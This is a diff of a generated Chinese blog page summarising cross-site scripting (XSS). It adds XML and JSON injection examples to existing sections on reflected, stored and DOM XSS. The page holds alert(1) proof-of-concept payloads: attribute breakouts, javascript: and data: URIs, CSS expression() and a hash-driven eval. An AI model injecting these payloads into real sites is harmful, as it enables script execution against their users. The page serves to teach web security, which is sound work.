@@ -109,7 +109,7 @@
 标签之间：
 
 1234567891011121314151617- 标签之间可以直接执行的：&amp;lt;div&amp;gt;[xss]&amp;lt;/div&amp;gt;payload: &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;- 有些标签之间不能">
-<meta property="og:updated_time" content="2020-02-28T08:51:30.001Z">
+<meta property="og:updated_time" content="2020-03-04T08:25:17.502Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XSS总结">
 <meta name="twitter:description" content="分类：反射型payload 在 url 之中，后台未进行有效处理将 payload 输出导致 js 代码执行。js 代码可能出现的位置：
@@ -375,6 +375,14 @@
 <li>标签之内</li>
 </ol>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">- 文本属性：</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"[xss]"</span> /&gt;</span></span><br><span class="line">payload: " onmouseover=alert(1) "/&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span><br><span class="line">  alert(1)</span><br><span class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">- src/href/action/,img的（dynsrc/lowsrc）等属性： payload: javascript:alert(1)</span><br><span class="line">data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== (IE不支持) -</span><br><span class="line">on*事件： payload:alert(1) -</span><br><span class="line">style属性内及css代码之中IE可执行，并且在IE9以上被防御，不适合其他浏览器：</span><br><span class="line">style="width:expression(js代码)" background-image:url('javascript:alert(2)')</span><br></pre></td></tr></table></figure>
+<ol>
+<li>XML XSS</li>
+</ol>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;![CDATA[&lt;script&gt;alert(1)&lt;/script&gt;]]&gt;</span><br></pre></td></tr></table></figure>
+<ol>
+<li>JSON XSS</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="string">'&#123;"movie": [&#123;"name": '</span> + value + <span class="string">'&#125;]'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// payload</span></span><br><span class="line"><span class="string">"12"</span>&#125;]&#125;;alert(<span class="number">1</span>)<span class="comment">//</span></span><br></pre></td></tr></table></figure>
 <h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p>经过处理请求，将 XSS 代码存储到数据库，然后输出到页面。这样导致 xss 攻击持久存在。通常通过表单提交，有一些服务也通过 url 提交，甚至有些存在于其他的 HTTP 头字段之中。<br>通常这种 xss 存在于个人信息，留言，文章日志等一些功能之中。<br>至于最终 js 代码存在的位置，我们依然可以根据上面判断。</p>
 <h3 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h3><p>这种 xss 是由于前端代码直接将 url 中的代码输出到页面导致。不与后台进行交互。</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">例如页面存在：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span><br><span class="line">  <span class="built_in">eval</span>(location.hash.substr(<span class="number">1</span>))</span><br><span class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">payload: http://hostname/path#alert(1)</span><br></pre></td></tr></table></figure>
@@ -525,7 +533,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">22</span>
+                <span class="site-state-item-count">23</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -547,7 +555,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">26</span>
+                <span class="site-state-item-count">28</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
